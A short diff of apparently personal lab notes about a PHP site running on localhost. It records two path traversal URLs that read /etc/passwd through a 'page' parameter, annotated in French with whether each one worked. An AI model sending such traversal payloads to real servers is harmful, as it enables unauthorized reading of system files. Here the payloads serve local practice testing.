@@ -6,9 +6,9 @@ A PHP website is now live on `localhost:8080`.
 
 ## Random Axel tests
 
-`http://localhost:8080/?page=../../../../etc/passwd`
+`http://localhost:8080/?page=../../../../etc/passwd` (non)
 
-`http://localhost:8080/?page=../../../../../../../etc/passwd`
+`http://localhost:8080/?page=../../../../../../../etc/passwd` (oui)
 
 ## ↓↓↓ CLEAN THIS ↓↓↓
 
